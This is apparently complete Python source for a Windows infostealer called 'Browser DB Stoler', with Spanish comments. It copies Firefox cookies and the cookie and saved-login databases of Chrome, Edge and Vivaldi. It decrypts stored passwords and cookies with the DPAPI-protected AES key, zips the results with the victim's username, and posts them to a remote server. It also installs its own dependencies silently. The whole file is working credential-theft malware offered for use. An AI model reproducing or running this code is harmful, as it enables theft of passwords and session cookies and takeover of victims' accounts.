r"""
    Browser DB Stoler
    ~~~~~~~~~~~~~~~~~
    Roba bases de datos de navegadores web y los envia a un servidor.
    Navegadores compatibles:
        - Firefox
        - Cualquier navegador web basado en Chromium (Chrome, Edge, Vivaldi, etc...)

    @author Crizacio
    @website crizacio.com
    @date 18/10/2023
"""
import os, sys, subprocess
import configparser
import json
import sqlite3
import shutil
import base64
import win32crypt
from time import gmtime, strftime
# from Cryptodome.Cipher import AES # pip install pycryptodome
from zipfile import ZipFile
if not os.name == "nt":
	sys.exit("This script only runs on Windows.")
try:
    import requests
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'], stdout=subprocess.DEVNULL)
        import requests
    except:
        sys.exit()
try:
    from Crypto.Cipher import AES
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'pycryptodome'], stdout=subprocess.DEVNULL)
        from Crypto.Cipher import AES
    except:
        sys.exit()

SERVER_HOST_POST = None
TEMPORAL_DIRECTORY = str(f"{os.path.expanduser('~')}\\AppData\\Local\\Temp")
TEMPORAL_WORKSPACE = str(f"{TEMPORAL_DIRECTORY}\\BrowserDBStoler")

def SetServerHostPost(host):
    global SERVER_HOST_POST
    SERVER_HOST_POST = host


def SendFile(filePath, BrowserName = None):
    try:
        with open(filePath, 'rb') as f:
            print(requests.post(
                SERVER_HOST_POST,
                files={
                    "file": f
                },
                data={
                    "user": os.getlogin(),
                    "browser": BrowserName
                }).text
            )
    except:
        print("Error: Can't send the file.")
        return None
def GetCurrentUserFolder():
    return os.path.expanduser('~')



# START - FIREFOX --------------------------------------------------
def GetFirefoxProfile():
    try:
        config = configparser.ConfigParser()
        config.read(str("{}\\AppData\\Roaming\\Mozilla\\Firefox\\profiles.ini".format(GetCurrentUserFolder())))
        firefoxProfile = str(config['Profile0']['Path'].replace("/", "\\\\"))
        return firefoxProfile
    except:
        print("Error: Firefox profile not found.")
        return None

def GetFirefoxCookies():
    try:
        firefoxProfile = GetFirefoxProfile()
        firefoxPath = str("{}\\AppData\\Roaming\\Mozilla\\Firefox\\{}\\".format(GetCurrentUserFolder(), firefoxProfile))
        zipfilePath = str('{}.zip'.format(os.getlogin()))
        with ZipFile(zipfilePath, 'w') as zip_object:
            zip_object.write(str('{}{}'.format(firefoxPath, "cookies.sqlite")))
        SendFile(zipfilePath, "Firefox")
    except:
        print("Error: Firefox cookies not found.")
        return None
# END - FIREFOX --------------------------------------------------



# START - Chromium based --------------------------------------------------
def GetChromiumProfile(ChromiumPath, BrowserName):
    try:
        f = open(str("{}{}".format(ChromiumPath, "Local State")))
        data = json.load(f)
        retorno = []
        for i in data['profile']['info_cache']:
            retorno.append(i)
        f.close()
        return retorno
    except:
        print("Error: Chromium '{}' profile not found.".format(BrowserName))
        return None

def CreateTempDirectory(BrowserName):
    try:
        if os.path.exists(TEMPORAL_WORKSPACE):
            shutil.rmtree(TEMPORAL_WORKSPACE)
        if os.path.exists(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")):
            shutil.rmtree(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}"))
        if not os.path.exists(TEMPORAL_WORKSPACE):
            os.mkdir(TEMPORAL_WORKSPACE)
        if not os.path.exists(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")):
            os.mkdir(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}"))
        return str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")
    except Exception as ex:
            print("Error: '{}'.".format(ex))
def CopyBrowserDataToTemp(ChromiumPath, BrowserName):
    try:
        tempDirectory = CreateTempDirectory(BrowserName)
        ChromiumProfiles = GetChromiumProfile(ChromiumPath, BrowserName)
        shutil.copyfile(str('{}{}'.format(ChromiumPath, "Local State")), str(f"{tempDirectory}\\Local State"))
        for profile in ChromiumProfiles:
            profileTempPath = str(f"{tempDirectory}\\{profile}")
            ChromiumProfilePath = str("{}{}\\".format(ChromiumPath, profile))
            # crea la carpeta del perfil
            if not os.path.exists(str(f"{profileTempPath}")):
                os.mkdir(str(f"{profileTempPath}"))
            # copia las carpetas a la carpeta temporal
            shutil.copyfile(str('{}{}'.format(ChromiumProfilePath, "Login Data")), str(f"{profileTempPath}\\Login Data"))
            shutil.copyfile(str('{}{}'.format(ChromiumProfilePath, "\\Network\\Cookies")), str(f"{profileTempPath}\\Cookies"))
        return [tempDirectory+"\\", ChromiumProfiles]
    except Exception as ex:
        print("Error: '{}'.".format(ex))
        return None
def ObtenerLlaveDeCifrado(ChromiumPath):
    jsonContent = None
    localstatePath = os.path.join(ChromiumPath, "Local State")
    try:
        with open(localstatePath, 'r') as file:
            jsonContent = json.loads(file.read())
    except:
        return None
    try:
        encryption_key = base64.b64decode(jsonContent['os_crypt']['encrypted_key'])[5:]
        encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    except:
        encryption_key = None
    return encryption_key
def DesencriptarValor(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def DescifrarCookies(ChromiumPath):
    try:
        encryption_key = ObtenerLlaveDeCifrado(ChromiumPath)
        cookiesFiles = []
        print("Descifrando cookies...")
        for root, dir, files in os.walk(ChromiumPath):
            if "Cookies" in files:
                cookiesFiles.append(os.path.join(root, "Cookies"))
        for cookie in cookiesFiles:
            conn = sqlite3.connect(cookie)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute("CREATE TABLE IF NOT EXISTS cocked (host_key TEXT, name TEXT, decrypted_value TEXT)")
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
            for host_key, name, value, encrypted_value in cursor.fetchall():
                host_key = host_key.decode('utf-8')
                name = name.decode('utf-8')
                value = DesencriptarValor(encrypted_value, encryption_key)
                cursor.execute("INSERT INTO cocked VALUES (?, ?, ?);", (host_key, name, value))
            conn.commit()
            conn.close()
        print("Cookies descifradas!")
    except Exception as ex:
        print("Error: '{}'.".format(ex))
def DescifrarSigning(ChromiumPath):
    try:
        encryption_key = ObtenerLlaveDeCifrado(ChromiumPath)
        signinFiles = []
        print("Descifrando sesiones...")
        for root, dir, files in os.walk(ChromiumPath):
            if "Login Data" in files:
                signinFiles.append(os.path.join(root, "Login Data"))
        for signin in signinFiles:
            conn = sqlite3.connect(signin)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute("CREATE TABLE IF NOT EXISTS cocked (origin_url TEXT, password_value TEXT)")
            cursor.execute('SELECT origin_url, password_value FROM logins')
            for origin_url, password_value in cursor.fetchall():
                origin_url = origin_url.decode('utf-8')
                valuePassword = DesencriptarValor(password_value, encryption_key)
                cursor.execute("INSERT INTO cocked VALUES (?, ?);", (origin_url, valuePassword))
            conn.commit()
            conn.close()
        print("Sesiones descifradas!")
    except Exception as ex:
        print("Error: '{}'.".format(ex))
def CrearArchivoEstructura(ChromiumPath, BrowserName, ChromiumInstallPath):
    try:
        datos = {
            "UserName": os.getlogin(),
            "ScriptDirectory": os.path.dirname(os.path.realpath(__file__)),
            "WorkingDirectory": ChromiumPath,
            "TemporalDirectory": TEMPORAL_WORKSPACE,
            "TimeAndDate": strftime("%d-%m-%Y %H:%M:%S", gmtime()),
            "WebBrowser": {
                "Name": BrowserName,
                "InstallDirectory": ChromiumInstallPath
            }
        }
        with open(TEMPORAL_WORKSPACE+'\\structure.json', 'w', encoding='utf-8') as f:
            json.dump(datos, f, ensure_ascii=False, indent=4)
    except Exception as ex:
        print("Error: '{}'.".format(ex))

def GetChromiumCookies(AppData_Path, BrowserName):
    try:
        ChromiumPath = str("{}\\AppData\\{}\\{}\\User Data\\".format(GetCurrentUserFolder(), AppData_Path, BrowserName))
        copiedInfo = CopyBrowserDataToTemp(ChromiumPath, BrowserName)
        DescifrarCookies(copiedInfo[0])
        DescifrarSigning(copiedInfo[0])
        CrearArchivoEstructura(copiedInfo[0], BrowserName, ChromiumPath)
        zipfilePath = str('{}\\{}-{}'.format(TEMPORAL_DIRECTORY, os.getlogin(), BrowserName))
        shutil.make_archive(zipfilePath, 'zip', TEMPORAL_WORKSPACE)
        SendFile(zipfilePath+".zip", BrowserName)
    except:
        print("Error: Chromium '{}' cookies not found.".format(BrowserName))
        return None
# END - Chromium based --------------------------------------------------



# START - Common Chromium based webbrowsers --------------------------------------------------
def GetChromeCookies():
    GetChromiumCookies("Local\\Google", "Chrome")

def GetEdgeCookies():
    GetChromiumCookies("Local\\Microsoft", "Edge")

def GetVivaldiCookies():
    GetChromiumCookies("Local", "Vivaldi")
# END - Common Chromium based webbrowsers --------------------------------------------------
